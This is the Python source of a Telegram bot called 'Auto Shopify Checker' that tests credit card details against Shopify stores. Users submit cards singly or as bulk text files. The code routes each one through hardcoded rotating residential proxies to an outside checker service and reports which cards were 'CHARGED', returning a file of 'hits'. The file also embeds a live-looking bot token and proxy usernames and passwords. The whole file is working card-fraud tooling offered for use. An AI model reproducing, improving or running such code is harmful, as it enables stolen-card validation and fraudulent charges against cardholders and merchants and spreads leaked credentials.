import asyncio
import httpx
import json
import logging
import os
import time
import html
import random
import io
import traceback
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
    CallbackQueryHandler,
    ConversationHandler,
)
from telegram.constants import ParseMode, ChatAction

# --- ⚙️ 1. BASIC SETUP & LOGGING ⚙️ ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)


# --- 🔑 2. CONFIGURATION & CONSTANTS 🔑 ---

# !!! SECURITY WARNING !!!
# Hardcoding your bot token is a major security risk.
# Anyone with access to this code will have full control over your bot.
# Do NOT share this file publicly with the token in it.
TELEGRAM_BOT_TOKEN = "7615802418:AAGKxCpVrDVGFbyd3aQi0_9G9CHGcJMCLEY"

CHECKER_API_URL = "https://sigmabro766.onrender.com/"
BINLIST_API_URL = "https://lookup.binlist.net/"

# --- Proxies ---
new_proxies_raw = [
    "38.154.227.167:5868:dmeigyzw:5ece3v7xz8d2", "198.23.239.134:6540:dmeigyzw:5ece3v7xz8d2",
    "207.244.217.165:6712:dmeigyzw:5ece3v7xz8d2", "107.172.163.27:6543:dmeigyzw:5ece3v7xz8d2",
    "216.10.27.159:6837:dmeigyzw:5ece3v7xz8d2", "142.147.128.93:6593:dmeigyzw:5ece3v7xz8d2",
    "64.64.118.149:6732:dmeigyzw:5ece3v7xz8d2", "136.0.207.84:6661:dmeigyzw:5ece3v7xz8d2",
    "206.41.172.74:6634:dmeigyzw:5ece3v7xz8d2", "104.239.105.125:6655:dmeigyzw:5ece3v7xz8d2",
]
formatted_new_proxies = [f"http://{p.split(':')[2]}:{p.split(':')[3]}@{p.split(':')[0]}:{p.split(':')[1]}" for p in new_proxies_raw]

PROXY_LIST = [
    "http://PP_2MX8KKO81J:soyjpcgu_country-us@ps-pro.porterproxies.com:31112",
    "http://In2nyCyUORV4KYeI:yXhbVJozQeBVVRnM@geo.g-w.info:10080",
] + formatted_new_proxies

COMMON_HTTP_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# --- Bot Conversation States ---
AWAIT_SITE = 1

# --- 💾 3. USER DATA PERSISTENCE 💾 ---
USER_SITES_FILE = "user_shopify_sites.json"
user_sites = {}

def load_user_sites():
    """Loads the user-site mapping from a JSON file into memory."""
    global user_sites
    if not os.path.exists(USER_SITES_FILE):
        return
    try:
        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            # JSON keys are strings, so convert them back to integers (user_id)
            user_sites = {int(k): v for k, v in data.items()}
    except (json.JSONDecodeError, IOError) as e:
        logger.error(f"Could not load user sites from {USER_SITES_FILE}: {e}")
        user_sites = {}

def save_user_sites():
    """Saves the current user-site mapping to a JSON file."""
    try:
        with open(USER_SITES_FILE, 'w', encoding='utf-8') as f:
            json.dump(user_sites, f, indent=4)
    except IOError as e:
        logger.error(f"Could not save user sites to {USER_SITES_FILE}: {e}")

def get_site_for_user(user_id):
    """Gets the saved Shopify site for a given user."""
    return user_sites.get(user_id)

def set_site_for_user(user_id, site_url):
    """Sets the Shopify site for a user and saves it."""
    user_sites[user_id] = site_url
    save_user_sites()


# --- 🌐 4. API & HELPER FUNCTIONS 🌐 ---
def parse_checker_api_response(response_text: str):
    """Safely parses JSON from the checker API's sometimes messy response."""
    if not response_text: return None
    try:
        # The API response is sometimes not clean JSON, find the start and end of the object.
        json_start = response_text.find('{')
        json_end = response_text.rfind('}')
        if json_start != -1 and json_end != -1:
            return json.loads(response_text[json_start : json_end + 1])
    except json.JSONDecodeError:
        logger.warning(f"Failed to decode JSON from response: {response_text[:200]}")
    return None

async def get_bin_details(bin_number: str):
    """Fetches credit card BIN details from the Binlist API."""
    default = {"scheme": "N/A", "type": "N/A", "brand": "N/A", "bank": "N/A", "country": "N/A", "emoji": "🌐"}
    if not bin_number or len(bin_number) < 6:
        return default

    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    mounts = {'all://': proxy} if proxy else None
    
    try:
        headers = {'Accept-Version': '3', **COMMON_HTTP_HEADERS}
        async with httpx.AsyncClient(mounts=mounts) as client:
            response = await client.get(f"{BINLIST_API_URL}{bin_number}", headers=headers, timeout=10.0)
        
        if response.status_code == 200:
            data = response.json()
            return {
                "scheme": data.get("scheme", "N/A").upper(),
                "type": data.get("type", "N/A").upper(),
                "brand": data.get("brand", "N/A").upper(),
                "bank": data.get("bank", {}).get("name", "N/A"),
                "country": data.get("country", {}).get("name", "N/A"),
                "emoji": data.get("country", {}).get("emoji", "🌐")
            }
        else:
             return default
    except (httpx.TimeoutException, httpx.ConnectError) as e:
        logger.error(f"BIN lookup failed for {bin_number}: {e}")
        return default

async def run_check(site: str, cc: str):
    """Runs a single card check against the API."""
    params = {"site": site, "cc": cc}
    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    mounts = {'all://': proxy} if proxy else None
    proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"

    try:
        async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, mounts=mounts) as client:
            response = await client.get(CHECKER_API_URL, params=params, timeout=45.0)
        
        api_data = parse_checker_api_response(response.text)
        if api_data:
            response_text = api_data.get("Response", "Unknown Response")
            if "Thank You" in response_text or "ORDER_PLACED" in response_text.upper():
                status = "CHARGED"
            elif "DECLINED" in response_text.upper():
                status = "DECLINED"
            else:
                status = "INFO"
            return {"status": status, "response": response_text, "proxy": proxy_host}
        else:
            return {"status": "ERROR", "response": "API response could not be parsed.", "proxy": proxy_host}
            
    except httpx.TimeoutException:
        return {"status": "ERROR", "response": "Request timed out.", "proxy": proxy_host}
    except httpx.ConnectError:
        return {"status": "ERROR", "response": "Connection failed to checker API.", "proxy": proxy_host}
    except Exception as e:
        logger.error(f"Unhandled error during check: {e}")
        return {"status": "ERROR", "response": str(e), "proxy": proxy_host}


# --- 💻 5. BOT COMMAND HANDLERS 💻 ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Displays the main welcome menu."""
    user = update.effective_user
    user_name = html.escape(user.username or user.first_name)
    
    greeting_message = f"""<b>🚀 AUTO SHOPIFY CHECKER 🚀</b>
<i>Developed by @alanjocc</i>

Greetings, <b>{user_name}</b>! The system is online and ready for operations.

<b>› User ID:</b> <code>{user.id}</code>
<b>› Status:</b> <font color="#28a745">Online & Ready</font>
<pre>────────────────────────</pre>
Select an action from the panel below to begin."""

    keyboard = [
        [InlineKeyboardButton("💳 Single Check", callback_data="nav:show_chk_help"), InlineKeyboardButton("📊 Mass Check", callback_data="nav:show_mchk_help")],
        [InlineKeyboardButton("⚙️ Set/View Site", callback_data="site:show_current"), InlineKeyboardButton("📖 View Commands", callback_data="nav:show_cmds")],
        [InlineKeyboardButton("🧑‍💻 Contact Developer", url="https://t.me/alanjocc")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query: # If called from a button, edit the message
        await update.callback_query.answer()
        await update.callback_query.message.edit_text(greeting_message, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    else: # If called directly via /start, send a new message
        await update.message.reply_text(greeting_message, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Displays the command list."""
    commands_text = """<b>📖 BOT COMMANDS</b>
<pre>────────────────────────</pre>
<b>GENERAL</b>
  <code>/start</code>  - Displays the main welcome menu.
  <code>/cmds</code>   - Shows this command list.

<b>CONFIGURATION</b>
  <code>/add &lt;url&gt;</code> - Sets your target Shopify site.
  <code>/my_site</code>  - Shows your currently configured site.

<b>CHECKING</b>
  <code>/chk N|M|Y|C</code> - Checks a single card.
  <code>/mchk</code> (reply to .txt) - Mass checks cards from a file."""
    
    keyboard = [[InlineKeyboardButton("« Back to Main Menu", callback_data="nav:show_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.message.edit_text(commands_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(commands_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /add <url> command directly."""
    if not context.args:
        await update.message.reply_text("Please provide a URL. Usage: <code>/add https://example.com</code>", parse_mode=ParseMode.HTML)
        return

    user_id = update.effective_user.id
    site_url = context.args[0]
    set_site_for_user(user_id, site_url)
    
    await update.message.reply_text(f"✅ **Site Updated!**\nYour target site is now set to:\n<code>{html.escape(site_url)}</code>", parse_mode=ParseMode.HTML)
    return ConversationHandler.END

async def my_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /my_site command directly."""
    user_id = update.effective_user.id
    site_url = get_site_for_user(user_id)
    
    if site_url:
        message_text = f"📍 **Your Current Site**\nYour checks are targeted at:\n<code>{html.escape(site_url)}</code>"
    else:
        message_text = "⚠️ **No Site Set**\nYou haven't set a target site yet."

    keyboard = [
        [InlineKeyboardButton("🔗 Update Site", callback_data="site:prompt_add")],
        [InlineKeyboardButton("« Back to Main Menu", callback_data="nav:show_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.message.edit_text(message_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(message_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /chk command for a single credit card."""
    user_id = update.effective_user.id
    site_url = get_site_for_user(user_id)
    
    if not site_url:
        await update.message.reply_text("⚠️ **No Site Set!**\nPlease use <code>/add &lt;url&gt;</code> or the settings menu to set a site first.", parse_mode=ParseMode.HTML)
        return

    if not context.args or context.args[0].count('|') != 3:
        await update.message.reply_text("⚠️ **Invalid Format!**\nUse: <code>/chk CARD|MONTH|YEAR|CVV</code>", parse_mode=ParseMode.HTML)
        return
        
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    start_time = time.time()
    
    cc_details = context.args[0]
    card_number = cc_details.split('|')[0]
    
    # Start both tasks concurrently
    check_task = asyncio.create_task(run_check(site_url, cc_details))
    bin_task = asyncio.create_task(get_bin_details(card_number[:6]))
    
    # Wait for both to complete
    check_result = await check_task
    bin_data = await bin_task
    
    time_taken = round(time.time() - start_time, 2)
    
    status_map = {
        "CHARGED": ("✅", "CHARGED"),
        "DECLINED": ("❌", "DECLINED"),
        "INFO": ("ℹ️", "INFO"),
        "ERROR": ("💥", "ERROR")
    }
    emoji, status_text = status_map.get(check_result["status"], ("❓", "UNKNOWN"))

    bin_info = f"{bin_data['scheme']} / {bin_data['type']} / {bin_data['brand']}"
    
    result_message = (
        f"<b>{emoji} {html.escape(status_text)}</b>\n"
        f"<b>Card:</b> <code>{html.escape(cc_details)}</code>\n"
        f"<b>Response:</b> <code>{html.escape(check_result['response'])}</code>\n"
        f"<pre>────────────────────────</pre>\n"
        f"<b>BIN:</b> {html.escape(bin_info)}\n"
        f"<b>Bank:</b> {html.escape(bin_data['bank'])}\n"
        f"<b>Country:</b> {bin_data['emoji']} {html.escape(bin_data['country'])}\n"
        f"<pre>────────────────────────</pre>\n"
        f"<i>Checked by {html.escape(update.effective_user.first_name)} in {time_taken}s via {html.escape(check_result['proxy'])}.</i>"
    )
    
    await update.message.reply_text(result_message, parse_mode=ParseMode.HTML)

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /mchk command for checking cards from a .txt file."""
    user_id = update.effective_user.id
    site_url = get_site_for_user(user_id)
    
    if not site_url:
        await update.message.reply_text("⚠️ **No Site Set!**\nPlease set a site before starting a mass check.", parse_mode=ParseMode.HTML)
        return

    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("⚠️ **No File!**\nPlease reply to a <code>.txt</code> file containing your cards to use this command.", parse_mode=ParseMode.HTML)
        return

    doc = update.message.reply_to_message.document
    if not doc.file_name.lower().endswith('.txt'):
        await update.message.reply_text("⚠️ **Invalid File Type!** Please provide a <code>.txt</code> file.", parse_mode=ParseMode.HTML)
        return
        
    # Download the file content into memory
    file = await context.bot.get_file(doc.file_id)
    file_content = (await file.download_as_bytearray()).decode('utf-8')
    cards = [line.strip() for line in file_content.splitlines() if line.strip() and line.count('|') == 3]

    if not cards:
        await update.message.reply_text("⚠️ **No Valid Cards Found!**\nMake sure your file contains cards in the format <code>CARD|MONTH|YEAR|CVV</code>, one per line.", parse_mode=ParseMode.HTML)
        return

    total_cards = len(cards)
    start_time = time.time()
    approved_count, declined_count = 0, 0
    results_log = []

    status_message = await update.message.reply_text(f"🚀 **Mass Check Initialized**\nParsing {total_cards} cards...", parse_mode=ParseMode.HTML)

    for i, cc in enumerate(cards):
        check_result = await run_check(site_url, cc)
        
        if check_result['status'] == 'CHARGED':
            approved_count += 1
            results_log.append(f"[HIT] {cc} -> {check_result['response']}")
        elif check_result['status'] == 'DECLINED':
            declined_count += 1

        # Update status message periodically to avoid hitting Telegram rate limits
        if i % 5 == 0 or (i + 1) == total_cards:
            elapsed_time = round(time.time() - start_time)
            progress_percent = round(((i + 1) / total_cards) * 100)
            
            progress_bar = '█' * (progress_percent // 10) + '░' * (10 - progress_percent // 10)

            update_text = (
                f"<b>📊 Mass Check In Progress...</b>\n"
                f"<b>Site:</b> <code>{html.escape(site_url)}</code>\n"
                f"<b>Progress:</b> [{progress_bar}] {progress_percent}%\n"
                f"<b>Checked:</b> {i + 1}/{total_cards}\n"
                f"<b>✅ Charged:</b> {approved_count}\n"
                f"<b>❌ Declined:</b> {declined_count}\n"
                f"<b>⏳ Time:</b> {elapsed_time}s"
            )
            try:
                await status_message.edit_text(update_text, parse_mode=ParseMode.HTML)
            except Exception:
                pass # Ignore if message is not modified
        
        await asyncio.sleep(1) # Small delay to be polite to the API

    final_summary_text = f"🏁 **Mass Check Complete**\nChecked {total_cards} cards in {round(time.time() - start_time)}s.\n\n✅ **{approved_count} Charged**\n❌ **{declined_count} Declined**"
    
    if results_log:
        result_file_content = "\n".join(results_log)
        result_filename = f"Hits_{approved_count}_{user_id}.txt"
        
        with io.BytesIO(result_file_content.encode('utf-8')) as f_to_send:
            f_to_send.name = result_filename
            await update.message.reply_document(
                document=f_to_send,
                caption=final_summary_text,
                parse_mode=ParseMode.HTML
            )
    else:
        await update.message.reply_text(final_summary_text + "\n\nNo charged cards were found.", parse_mode=ParseMode.HTML)


# --- 💬 6. CONVERSATION & CALLBACK HANDLERS 💬 ---
async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Routes all inline button clicks to the correct function."""
    query = update.callback_query
    await query.answer() # Acknowledge the button press
    
    action = query.data

    if action == "nav:show_start":
        await start_command(update, context)
    elif action == "nav:show_cmds":
        await cmds_command(update, context)
    elif action == "site:show_current":
        await my_site_command(update, context)
    elif action == "site:prompt_add":
        await query.message.edit_text("🔗 **Enter Your Shopify Site URL**\nSend the full URL (e.g., `https://kith.com`) as a message. To cancel, type /cancel.", parse_mode=ParseMode.HTML)
        return AWAIT_SITE
    elif action == "nav:show_chk_help":
        await query.message.edit_text("To perform a single check, use the command:\n<code>/chk CARD|MONTH|YEAR|CVV</code>", parse_mode=ParseMode.HTML)
    elif action == "nav:show_mchk_help":
        await query.message.edit_text("To perform a mass check, create a <code>.txt</code> file with one card per line, then reply to the file with the <code>/mchk</code> command.", parse_mode=ParseMode.HTML)


async def receive_site_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receives and saves the site URL from the user after being prompted."""
    user_id = update.effective_user.id
    site_url = update.message.text.strip()
    set_site_for_user(user_id, site_url)
    
    await update.message.reply_text(f"✅ **Site Updated!**\nYour target site is now set to:\n<code>{html.escape(site_url)}</code>", parse_mode=ParseMode.HTML)
    # Go back to the main menu
    await start_command(update, context)
    return ConversationHandler.END

async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancels the current conversation (e.g., adding a site)."""
    await update.message.reply_text("Action cancelled. Returning to main menu.")
    await start_command(update, context)
    return ConversationHandler.END

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Logs errors and sends a user-friendly message."""
    logger.error("Exception while handling an update:", exc_info=context.error)
    
    # Extract traceback
    tb_list = traceback.format_exception(None, context.error, context.error.__traceback__)
    tb_string = "".join(tb_list)
    
    # You can send error details to yourself for debugging
    # For example, replace 'YOUR_USER_ID' with your actual Telegram user ID
    # await context.bot.send_message(chat_id='YOUR_USER_ID', text=f"An error occurred: {tb_string}")
    
    if update and isinstance(update, Update):
        await update.effective_message.reply_text("🤖 Oops! An internal error occurred. The developer has been notified.")


# --- 🚀 7. BOT LAUNCHER 🚀 ---
def main():
    """Starts the bot."""
    if not TELEGRAM_BOT_TOKEN or "YOUR_TOKEN" in TELEGRAM_BOT_TOKEN:
        logger.critical("CRITICAL: Telegram Bot Token is missing or is a placeholder.")
        return

    logger.info("System initializing...")
    load_user_sites()
    
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Conversation handler for adding a site interactively
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_callback_handler, pattern='^site:prompt_add$')],
        states={
            AWAIT_SITE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_site_url)]
        },
        fallbacks=[CommandHandler('cancel', cancel_conversation)]
    )

    application.add_handler(conv_handler)
    
    # Command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("cmds", cmds_command))
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("my_site", my_site_command))
    application.add_handler(CommandHandler("chk", chk_command))
    
    # Message handler for /mchk must check for replies
    application.add_handler(MessageHandler(filters.COMMAND & filters.REPLY, mchk_command))
    
    # Fallback callback handler for all other buttons
    application.add_handler(CallbackQueryHandler(button_callback_handler))
    
    # Universal error handler
    application.add_error_handler(error_handler)
    
    logger.info("Bot is online and polling for updates.")
    application.run_polling()


if __name__ == "__main__":
    main()
